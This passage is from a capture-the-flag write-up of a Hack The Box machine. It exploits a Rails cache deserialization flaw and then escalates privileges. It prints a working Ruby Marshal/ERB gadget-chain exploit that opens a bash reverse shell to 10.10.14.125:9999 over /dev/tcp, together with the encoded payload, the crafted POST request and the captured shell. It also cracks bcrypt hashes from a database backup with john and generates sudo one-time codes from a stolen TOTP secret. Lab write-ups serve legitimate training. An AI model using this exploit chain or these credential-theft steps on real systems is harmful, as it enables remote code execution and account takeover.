ActiveRecord::Base</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> has_many :articles</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> has_secure_password</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> VALID_USER_REGEX = /\A[\w\d]+\z/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                      format: { with: VALID_USER_REGEX }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> validates :email, presence: true, length: { maximum: 105 }, uniqueness: { case_sensitive: false },</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                   format: { with: VALID_EMAIL_REGEX }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> before_save { self.email = email.downcase }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So the username must contains only alphanumeric characters and be 3 to 25 chars
long.
At first glance it looks impossible to poison the username with a malicious
payload to corrupt the cache.
But a more in depth analysis shows that we will be able to perform our
deserialization to RCE.</p><p>Looking back at <code>app/controllers/users_controller.rb</code> the username is
written into the cache without any control (what we just saw in <code>app/models/user.rb</code>
are constraints on the database not the cache), then it will update the database
but fails because there username format won&#x27;t we respected and so it will trigger
the cache deletion. But the deletion won&#x27;t work because as the payload will be
evaluated it will crash the app (500 error) so the cached value will stay stored
and be retrieved on a subsequent fetch request.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="web-exploitation">Web exploitation<a href="#web-exploitation" class="hash-link" aria-label="Direct link to Web exploitation" title="Direct link to Web exploitation">​</a></h2><p>Since it&#x27;s an authenticated vulnerability (yes to update your username you need
an account), let&#x27;s register one on the blog (<a href="http://10.10.10.211:8080/signup" target="_blank" rel="noopener noreferrer">http://10.10.10.211:8080/signup</a>).</p><p>We can edit the username at this address <a href="http://10.10.10.211:8080/users/19/edit" target="_blank" rel="noopener noreferrer">http://10.10.10.211:8080/users/19/edit</a>
but before that we&#x27;ll need to craft a payload.</p><p>Let&#x27;s retrieve the PoC from the H1 report and modify it a little bit to include
a reverse shell and url-encode the payload:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;erb&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;rails/all&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;uri&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">remote_code = &lt;&lt;-RUBY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">`/bin/bash -c &quot;bash -i &amp;&gt;/dev/tcp/10.10.14.125/9999 0&gt;&amp;1&quot;`</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RUBY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">erb = ERB.allocate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">erb.instance_variable_set(:@src, remote_code)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">erb.instance_variable_set(:@lineno, 0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exploit_data = Marshal.dump(deprecation)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts URI.encode_www_form(username: exploit_data)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Lets&#x27; build the payload:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ bundle exec ruby exploit.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">username=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Intercept traffic with Burp and replace the username with the payload.</p><div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">POST /users/19 HTTP/1.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host: 10.10.10.211:8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept-Language: en-US,en;q=0.5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept-Encoding: gzip, deflate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Referer: http://10.10.10.211:8080/users/19/edit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Length: 584</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Origin: http://10.10.10.211:8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection: close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Cookie: _session_id=39429a031ee66edae6af06579185eb80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">utf8=%E2%9C%93&amp;_method=patch&amp;authenticity_token=tlufjzm%2FbY9fBxS%2Bu1QqkY%2BoaSXn3cEL40I1tGF6g4lYvmhcsv8i5NKjpDuOnn6vOABZIzmfLrWS%2Fy7vjgEAsQ%3D%3D&amp;user%5Busername%5D=username=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&amp;commit=Update+User</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We retrieve the shell on our listener:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ rlwrap pwncat -l 9999 -vv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on :::9999 (family 10/IPv6, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Client connected from 10.10.10.211:51176 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: cannot set terminal process group (811): Inappropriate ioctl for device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: no job control in this shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bill@jewel:~/blog$ id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1000(bill) gid=1000(bill) groups=1000(bill)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bill@jewel:~$ cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">02d71a6b8858cc2812ee368bc1ab355b</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-bill-to-root">Privilege Escalation of Machine : from bill to root<a href="#privilege-escalation-of-machine--from-bill-to-root" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from bill to root" title="Direct link to Privilege Escalation of Machine : from bill to root">​</a></h2><p>Let&#x27;s get an interactive shell:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bill@jewel:~$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can&#x27;t use <code>sudo -l</code> because we don&#x27;t know bill&#x27;s password.</p><p>Let&#x27;s find backup or config files in hope to discover passwords:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bill@jewel:~$ find / -name *.sql -type f 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/var/backups/dump_2020-08-27.sql</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/share/postgresql/11/extension/citext--1.4--1.5.sql</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bill@jewel:~$ grep -n password /var/backups/dump_2020-08-27.sql</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">132:    password_digest character varying</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">229:COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s dig around line 229:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: rails_dev</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">COPY </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">public</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">users </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> username</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> created_at</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> updated_at</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> password_digest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> stdin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">2</span><span class="token plain">       jennifer        jennifer</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">@mail.htb</span><span class="token plain">       </span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">27</span><span class="token plain"> </span><span class="token number">05</span><span class="token plain">:</span><span class="token number">44</span><span class="token plain">:</span><span class="token number">28.551735</span><span class="token plain">      </span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">27</span><span class="token plain"> </span><span class="token number">05</span><span class="token plain">:</span><span class="token number">44</span><span class="token plain">:</span><span class="token number">28.551735</span><span class="token plain">      $</span><span class="token number">2</span><span class="token plain">a$</span><span class="token number">12</span><span class="token plain">$sZac9R2VSQYjOcBTTUYy6</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Zd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token number">5</span><span class="token plain">I02OnmkKnD3zA6MqMrzLKz0jeDO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">1</span><span class="token plain">       bill    bill</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">@mail.htb</span><span class="token plain">   </span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">26</span><span class="token plain"> </span><span class="token number">10</span><span class="token plain">:</span><span class="token number">24</span><span class="token plain">:</span><span class="token number">03.878232</span><span class="token plain">      </span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">27</span><span class="token plain"> </span><span class="token number">09</span><span class="token plain">:</span><span class="token number">18</span><span class="token plain">:</span><span class="token number">11.636483</span><span class="token plain">      $</span><span class="token number">2</span><span class="token plain">a$</span><span class="token number">12</span><span class="token plain">$QqfetsTSBVxMXpnTR</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">\</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s ask my old pall John if he knows them:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">jennifer:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bill:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I found bill&#x27;s password but not jennifer one.</p><p><code>bill</code> / <code>spongebob</code></p><p>Trying sudo again we are asked for a verification code, it reminds me when
I set up OTP with <a href="https://wiki.archlinux.org/index.php/Google_Authenticator" target="_blank" rel="noopener noreferrer"><code>libpam-google-authenticator</code></a> for a SSH server.</p><p>We can find bill&#x27;s OTP private key in his home directory:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bill@jewel:~$ cat .google_authenticator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2UQI3R52WFCLE6JTLDCSJYMJH4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&quot; WINDOW_SIZE 17</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&quot; TOTP_AUTH</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I was able to generate a one time password with oath-toolkit:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">297774</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But I kept having this error while trying to auth:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Error &quot;Operation not permitted&quot; while writing config</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>TOTP is time based and I&#x27;m not in the same timezone than the box:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># box</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Sun 21 Feb 20:45:21 GMT 2021</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># my machine</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Sun Feb 21 09:35:41 PM CET 2021</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s print the box time in RFC format:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ date --rfc-3339=seconds</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2021-02-21 20:50:55+00:00</span><br></span></code></pre><div class="buttonGroup__atx"><button 